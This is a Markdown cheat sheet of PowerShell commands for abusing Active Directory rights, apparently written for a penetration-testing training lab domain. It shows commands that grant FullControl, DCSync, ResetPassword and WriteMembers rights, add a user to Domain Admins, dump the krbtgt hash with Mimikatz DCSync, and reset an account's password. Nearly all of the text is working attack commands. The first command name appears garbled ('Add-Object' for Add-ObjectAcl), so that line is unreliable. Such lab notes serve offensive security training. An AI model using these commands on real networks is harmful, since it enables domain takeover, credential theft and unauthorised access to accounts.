# Rights Abuse

### <mark style="color:orange;">FullControl Rights</mark>

```
# Using PowerView
Add-Object -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights "All" -Verbose

# Using AD Module
Set-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -Verbose

# Add new Domain Admin
# Using PowerView_dev
Add-DomainGroupMember -Identity "Domain Admins" -Members testda -Verbose

# Using AD Module
Add-ADGroupMember -Identity "Domain Admins" -Members testda
```

### <mark style="color:orange;">DCSync Rights</mark>

```
# Confirm if user already has DCSync rights with PowerView
Get-ObjectAcl -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs | ?{ ($_.IdentityReference -match "student572") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match "GenericAll")) }

# Using PowerView
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName "student572" -Rights "DCSync" -Verbose

# Using AD Module
Set-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight "DCSync" -Verbose

# Execute DCSync to dump hash for krbtgt account
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### <mark style="color:orange;">ResetPassword Rights</mark>

```
# Using PowerView
Add-ObjectAcl -TargetADSprefix 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights "ResetPassword" -Verbose

# Using AD Module
Set-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight "ResetPassword" -Verbose

# Reset password for account
# Using PowerView_dev
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose

# Using AD Module
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

### <mark style="color:orange;">WriteMembers Rights</mark>

```
# Using PowerView
Add-ObjectAcl -TargetADSprefix 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student572 -Rights "WriteMembers" -Verbose

# Using AD Module
Set-ADACL -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student572 -GUIDRight "WriteMembers" -Verbose
```
